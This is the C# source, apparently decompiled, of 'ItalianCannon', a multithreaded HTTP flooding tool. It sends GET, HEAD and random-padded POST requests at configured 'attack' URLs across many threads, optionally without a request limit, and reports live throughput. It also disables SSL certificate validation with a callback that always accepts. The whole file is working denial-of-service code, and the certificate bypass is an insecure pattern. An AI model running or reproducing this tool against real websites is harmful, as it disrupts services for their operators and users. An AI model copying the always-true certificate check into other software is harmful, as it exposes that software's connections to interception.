﻿// ItalianCannon.Program
using ItalianCannon;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;

namespace ItalianCannon
{
    [StandardModule]
    internal sealed class Program
    {
        [STAThread]
        public static void Main(string[] args)
        {
            Configurations.Initiate();
            Console.WriteLine("                                            \r\n____________       __________               \r\n____  _/_  /______ ___  /__(_)_____ _______ \r\n __  / _  __/  __ `/_  /__  /_  __ `/_  __ \\\r\n__/ /  / /_ / /_/ /_  / _  / / /_/ /_  / / /\r\n/___/  \\__/ \\__,_/ /_/  /_/  \\__,_/ /_/ /_/ \r\n                                            \r\n_________                                   \r\n__  ____/_____ ___________________________  \r\n_  /    _  __ `/_  __ \\_  __ \\  __ \\_  __ \\ \r\n/ /___  / /_/ /_  / / /  / / / /_/ /  / / / \r\n\\____/  \\__,_/ /_/ /_//_/ /_/\\____//_/ /_/  \r\n(ASCII Art Generated by patorjk.com)\r\n");
            SOPT.Out("ItalianCannon version 1.0.6-rs-b27-CSharp", "MAIN", SOPT.LogLevels.INFO, false, false);
            SOPT.Out("Initiating color profiles...", "MAIN", SOPT.LogLevels.INFO, false, false);
            SOPT.dpreColor = Console.ForegroundColor;
            SOPT.dbakColor = Console.BackgroundColor;
            if (Constants.CurrentConfigurations.EnableAnimations)
            {
                new Thread(Program.ThreadAnimations).Start();
                new Thread(Program.ThreadSpeedCalc).Start();
            }
            checked
            {
                if (Constants.CurrentConfigurations.RandomPOST)
                {
                    SOPT.Out("Generating random POST data (" + Conversions.ToString(Constants.CurrentConfigurations.RandomPOSTLength) + "-bytes) ...", "MAIN", SOPT.LogLevels.INFO, true, false);
                    Random CharPicker = new Random();
                    long randomPOSTLength = Constants.CurrentConfigurations.RandomPOSTLength;
                    for (long k = 0L; k <= randomPOSTLength; k++)
                    {
                        Constants.RandomPOSTData += Conversions.ToString(Convert.ToChar(CharPicker.Next(32, 126)));
                    }
                }
                if (Constants.CurrentConfigurations.DisableSSLValidation)
                {
                    ServicePointManager.ServerCertificateValidationCallback = Program.FakeCertCallBack;
                    SOPT.Out("SSL Certificate Validation has been disabled.", "MAIN", SOPT.LogLevels.INFO, true, false);
                }
                int TotalThreads = 0;
                foreach (Configurations.AtkUrl teaCupTarget in Constants.CurrentConfigurations.TeaCupTargets)
                {
                    TotalThreads += teaCupTarget.Threads;
                }
                SOPT.Out("Starting threads... Your current threads number (total) was " + Conversions.ToString(TotalThreads) + ".", "AU", SOPT.LogLevels.INFO, true, false);
                Constants.SW.Start();
                if (Constants.CurrentConfigurations.TeaCupTargets.Count == 0)
                {
                    SOPT.Out("NO URL SPECIFIED!", "AU", SOPT.LogLevels.EXCEPTION, true, true);
                    Environment.Exit(1);
                }
                if (Constants.CurrentConfigurations.TeaCupTargets.Count == 1)
                {
                    Configurations.AtkUrl atkUrl = Constants.CurrentConfigurations.TeaCupTargets[0];
                    Constants.TeaCupTarget = atkUrl.Url;
                    int threads = atkUrl.Threads;
                    for (int j = 1; j <= threads; j++)
                    {
                        new Thread(Program.ThreadRun).Start();
                    }
                    Thread.Sleep(500);
                }
                else
                {
                    SOPT.Out("Multi-URL mode enabled.", "AU", SOPT.LogLevels.INFO, true, false);
                    foreach (Configurations.AtkUrl teaCupTarget2 in Constants.CurrentConfigurations.TeaCupTargets)
                    {
                        Thread.Sleep(500);
                        SOPT.Out("===== TID range BEGINS at " + Conversions.ToString(Constants.ThrId) + " for URL: " + teaCupTarget2.Url, "MAIN", SOPT.LogLevels.INFO, true, false);
                        Constants.TeaCupTarget = teaCupTarget2.Url;
                        int threads2 = teaCupTarget2.Threads;
                        for (int i = 1; i <= threads2; i++)
                        {
                            new Thread(Program.ThreadRun).Start();
                        }
                        Thread.Sleep(500);
                        SOPT.Out("===== TID range ENDS at " + Conversions.ToString(Constants.ThrId) + " for URL: " + teaCupTarget2.Url, "MAIN", SOPT.LogLevels.INFO, true, false);
                    }
                }
                SOPT.Out("Dispatching READY signal...", "MAIN", SOPT.LogLevels.INFO, true, false);
                Constants.ThreadsReady = true;
                SOPT.Out("Started. Type 'exit' to stop.", "MAIN", SOPT.LogLevels.INFO, true, false);
                while (true)
                {
                    if (Console.ReadLine().ToLower() == "exit")
                    {
                        Environment.Exit(0);
                    }
                    SOPT.Out("You can type 'exit' or press ^C to stop.", "MAIN", SOPT.LogLevels.WARN, true, false);
                }
            }
        }

        public static void ThreadRun()
        {
            checked
            {
                Constants.ThrId++;
                int ThrId = Constants.ThrId;
                string TeaCupTarget = Constants.TeaCupTarget;
                SOPT.Out("Starting... / URL: " + TeaCupTarget, "THR" + Conversions.ToString(ThrId), SOPT.LogLevels.INFO, true, false);
                while (!Constants.ThreadsReady)
                {
                    Thread.Sleep(100);
                }
                TimeSpan elapsed;
                for (long i = 1L; i != Constants.CurrentConfigurations.MaxRequestsPerThread; i++)
                {
                    try
                    {
                        string HITRequest = "GET";
                        if (Constants.CurrentConfigurations.RandomHEAD & Program.RandomHIT(Constants.CurrentConfigurations.RandomHEADRate))
                        {
                            WebRequest webRequest = WebRequest.Create(new Uri(TeaCupTarget));
                            webRequest.Method = "HEAD";
                            webRequest.GetResponse();
                            Constants.Total = Convert.ToUInt64(decimal.Add(new decimal(Constants.Total), decimal.One));
                            string[] obj = new string[7];
                            elapsed = Constants.SW.Elapsed;
                            obj[0] = elapsed.ToString();
                            obj[1] = "/";
                            obj[2] = Conversions.ToString(i);
                            obj[3] = "thr./";
                            obj[4] = Conversions.ToString(Constants.Total);
                            obj[5] = "ts/THR";
                            obj[6] = Conversions.ToString(ThrId);
                            SOPT.Out("HEAD OK", string.Concat(obj), SOPT.LogLevels.INFO, true, false);
                        }
                        else
                        {
                            WebClient client = new WebClient();
                            try
                            {
                                client.Headers.Add(HttpRequestHeader.UserAgent, Constants.CurrentConfigurations.UserAgent);
                                foreach (Configurations.Header extraHTTPHeader in Constants.CurrentConfigurations.ExtraHTTPHeaders)
                                {
                                    client.Headers.Add(extraHTTPHeader.HType, extraHTTPHeader.Content);
                                }
                                long Size;
                                if (Constants.CurrentConfigurations.RandomPOST & Program.RandomHIT(Constants.CurrentConfigurations.RandomPOSTRate))
                                {
                                    HITRequest = "POST";
                                    Size = Constants.CurrentConfigurations.RandomPOSTLength;
                                    client.UploadData(TeaCupTarget, Encoding.UTF8.GetBytes(Constants.RandomPOSTData));
                                }
                                else
                                {
                                    Size = client.DownloadData(TeaCupTarget).Length;
                                }
                                Constants.TotalDownloaded = Convert.ToUInt64(decimal.Add(new decimal(Constants.TotalDownloaded), new decimal(Size)));
                            }
                            finally
                            {
                                if (client != null)
                                {
                                    unchecked((IDisposable)client).Dispose();
                                }
                            }
                            Constants.Total = Convert.ToUInt64(decimal.Add(new decimal(Constants.Total), decimal.One));
                            string text = HITRequest + " OK";
                            string[] obj2 = new string[7];
                            elapsed = Constants.SW.Elapsed;
                            obj2[0] = elapsed.ToString();
                            obj2[1] = "/";
                            obj2[2] = Conversions.ToString(i);
                            obj2[3] = "thr./";
                            obj2[4] = Conversions.ToString(Constants.Total);
                            obj2[5] = "ts/THR";
                            obj2[6] = Conversions.ToString(ThrId);
                            SOPT.Out(text, string.Concat(obj2), SOPT.LogLevels.INFO, true, false);
                        }
                    }
                    catch (WebException ex2)
                    {
                        ProjectData.SetProjectError(ex2);
                        WebException sEx = ex2;
                        if (!Constants.CurrentConfigurations.IgnoreHTTPError)
                        {
                            Constants.TotalFail = Convert.ToUInt64(decimal.Add(new decimal(Constants.TotalFail), decimal.One));
                            string text2 = "GET ERR: " + sEx.Message;
                            string[] obj3 = new string[7];
                            elapsed = Constants.SW.Elapsed;
                            obj3[0] = elapsed.ToString();
                            obj3[1] = "/";
                            obj3[2] = Conversions.ToString(i);
                            obj3[3] = "thr./";
                            obj3[4] = Conversions.ToString(Constants.Total);
                            obj3[5] = "ts/THR";
                            obj3[6] = Conversions.ToString(ThrId);
                            SOPT.Out(text2, string.Concat(obj3), SOPT.LogLevels.EXCEPTION, true, false);
                            ProjectData.ClearProjectError();
                        }
                        else
                        {
                            short RCode = default(short);
                            if (sEx.Status == WebExceptionStatus.ProtocolError)
                            {
                                RCode = (short)unchecked((HttpWebResponse)sEx.Response).StatusCode;
                            }
                            Constants.Total = Convert.ToUInt64(decimal.Add(new decimal(Constants.Total), decimal.One));
                            string text3 = "GET NG: HTTP/" + Conversions.ToString(RCode);
                            string[] obj4 = new string[7];
                            elapsed = Constants.SW.Elapsed;
                            obj4[0] = elapsed.ToString();
                            obj4[1] = "/";
                            obj4[2] = Conversions.ToString(i);
                            obj4[3] = "thr./";
                            obj4[4] = Conversions.ToString(Constants.Total);
                            obj4[5] = "ts/THR";
                            obj4[6] = Conversions.ToString(ThrId);
                            SOPT.Out(text3, string.Concat(obj4), SOPT.LogLevels.INFO, true, false);
                            ProjectData.ClearProjectError();
                        }
                    }
                    catch (Exception ex3)
                    {
                        ProjectData.SetProjectError(ex3);
                        Exception ex = ex3;
                        Constants.TotalFail = Convert.ToUInt64(decimal.Add(new decimal(Constants.TotalFail), decimal.One));
                        string text4 = "REQ ERR: " + ex.Message;
                        string[] obj5 = new string[7];
                        elapsed = Constants.SW.Elapsed;
                        obj5[0] = elapsed.ToString();
                        obj5[1] = "/";
                        obj5[2] = Conversions.ToString(i);
                        obj5[3] = "thr./";
                        obj5[4] = Conversions.ToString(Constants.Total);
                        obj5[5] = "ts/THR";
                        obj5[6] = Conversions.ToString(ThrId);
                        SOPT.Out(text4, string.Concat(obj5), SOPT.LogLevels.EXCEPTION, true, false);
                        ProjectData.ClearProjectError();
                    }
                    Thread.Sleep(Constants.CurrentConfigurations.IntervalPerThread);
                }
                string[] obj6 = new string[7];
                elapsed = Constants.SW.Elapsed;
                obj6[0] = elapsed.ToString();
                obj6[1] = "/";
                obj6[2] = Conversions.ToString(Constants.CurrentConfigurations.MaxRequestsPerThread);
                obj6[3] = "thr./";
                obj6[4] = Conversions.ToString(Constants.Total);
                obj6[5] = "ts/THR";
                obj6[6] = Conversions.ToString(ThrId);
                SOPT.Out("Max requests limit exceeded. Stopped.", string.Concat(obj6), SOPT.LogLevels.INFO, true, false);
                if (Constants.CurrentConfigurations.EnableAnimations)
                {
                    Constants.ThrId--;
                }
            }
        }

        public static void ThreadSpeedCalc()
        {
            Constants.DLSpeed = "[Pending...]";
            ulong PrevDL = Constants.TotalDownloaded;
            Thread.Sleep(1000);
            while (true)
            {
                Constants.DLDelta = (float)(double)checked(Constants.TotalDownloaded - PrevDL);
                Constants.DLSpeed = "[" + Program.JudgeSizeUnit((double)(Constants.DLDelta * 2f)) + "/s / " + Program.JudgeSizeUnit((double)Constants.TotalDownloaded) + "]";
                PrevDL = Constants.TotalDownloaded;
                Thread.Sleep(500);
            }
        }

        public static void ThreadAnimations()
        {
            ulong count = 0uL;
            short prevLength = 0;
            int TotalThreads = 0;
            checked
            {
                foreach (Configurations.AtkUrl teaCupTarget in Constants.CurrentConfigurations.TeaCupTargets)
                {
                    TotalThreads += teaCupTarget.Threads;
                }
                Console.Write("Starting...");
                Thread.Sleep(1000);
                int j = 1;
                do
                {
                    Console.Write("\b");
                    j++;
                }
                while (j <= 11);
                while (true)
                {
                    if (prevLength != 0)
                    {
                        int num = prevLength;
                        for (int i = 0; i <= num; i++)
                        {
                            Console.Write("\b");
                        }
                    }
                    bool overflow2 = false;
                    ConsoleColor prevFore = Console.ForegroundColor;
                    string max = Conversions.ToString(Constants.CurrentConfigurations.MaxRequestsPerThread);
                    if (Conversions.ToDouble(max) == 0.0)
                    {
                        max = "\b\b\bUNLIMITED";
                    }
                    string sb9 = "";
                    string sb8 = Program.GetAnimationChar(Convert.ToInt32(decimal.Remainder(new decimal(count), new decimal(13L))));
                    string sb7 = "[" + Constants.SW.Elapsed.ToString() + "]";
                    string sb6 = "[" + Conversions.ToString(Constants.ThrId) + "/" + Conversions.ToString(TotalThreads) + "THR]";
                    string sb5 = "[" + Conversions.ToString(Constants.Total) + "TS/" + Conversions.ToString(Constants.TotalFail) + "FL]";
                    string sb4 = "[MAX" + max + "]";
                    string sb3 = Constants.DLSpeed;
                    string sb2 = "";
                    string sb = "          ";
                    if (Constants.ThrId == 0)
                    {
                        sb2 = "[NO THREADS ALIVE]";
                        sb9 = "[!]";
                    }
                    else
                    {
                        sb9 = Program.GetAnimationBlock(Convert.ToInt32(decimal.Remainder(new decimal(count), new decimal(8L))));
                    }
                    overflow2 = (unchecked((byte)((("[OVERFLOW!]" + sb9 + sb8 + sb7 + sb6 + sb5 + sb4 + sb3 + sb2 + sb).Length >= Console.WindowWidth) ? 1 : 0)) != 0);
                    prevLength = (short)(sb9 + sb8 + sb7 + sb6 + sb5 + sb4 + sb3 + sb2 + sb).Length;
                    if (overflow2)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.Write("[OVERFLOW!]");
                    }
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.Write(sb9);
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write(sb8);
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.Write(sb7);
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.Write(sb6);
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write(sb5);
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write(sb4);
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write(sb3);
                    Console.ForegroundColor = ConsoleColor.Magenta;
                    Console.Write(sb2);
                    Console.ForegroundColor = prevFore;
                    Console.Write(sb);
                    count = Convert.ToUInt64(decimal.Add(new decimal(count), decimal.One));
                    Thread.Sleep(250);
                }
            }
        }

        public static string GetAnimationBlock(int percentage)
        {
            switch (percentage)
            {
            case 0:
                return "[/]";
            case 1:
                return "[-]";
            case 2:
                return "[\\]";
            case 3:
                return "[|]";
            case 4:
                return "[/]";
            case 5:
                return "[-]";
            case 6:
                return "[\\]";
            case 7:
                return "[|]";
            default:
                return "[/]";
            }
        }

        public static string GetAnimationChar(int percentage)
        {
            switch (percentage)
            {
            case 0:
                return "[*         ]";
            case 1:
                return "[**        ]";
            case 2:
                return "[***       ]";
            case 3:
                return "[ ***      ]";
            case 4:
                return "[  ***     ]";
            case 5:
                return "[   ***    ]";
            case 6:
                return "[    ***   ]";
            case 7:
                return "[     ***  ]";
            case 8:
                return "[      *** ]";
            case 9:
                return "[       ***]";
            case 10:
                return "[        **]";
            case 11:
                return "[         *]";
            default:
                return "[          ]";
            }
        }

        public static string JudgeSizeUnit(double Size)
        {
            string SizeUnit = "B";
            if (Size >= 1000.0)
            {
                Size /= 1000.0;
                SizeUnit = "KiB";
                if (Size >= 1024.0)
                {
                    SizeUnit = "MiB";
                    Size /= 1024.0;
                    if (Size >= 1024.0)
                    {
                        SizeUnit = "GiB";
                        Size /= 1024.0;
                        if (Size >= 1024.0)
                        {
                            SizeUnit = "TiB";
                            Size /= 1024.0;
                            if (Size >= 1024.0)
                            {
                                SizeUnit = "PiB";
                                Size /= 1024.0;
                                if (Size >= 1024.0)
                                {
                                    SizeUnit = "EiB";
                                    Size /= 1024.0;
                                }
                            }
                        }
                    }
                }
            }
            return Conversions.ToString(Math.Round(Size, 2)) + SizeUnit;
        }

        public static bool FakeCertCallBack(object Sender, X509Certificate Cert, X509Chain Chain, SslPolicyErrors error)
        {
            return true;
        }

        public static bool RandomHIT(byte Probability)
        {
            short Result = checked((short)new Random().Next(0, 101));
            if (Result > 0 & Result <= Probability)
            {
                return true;
            }
            return false;
        }
    }
}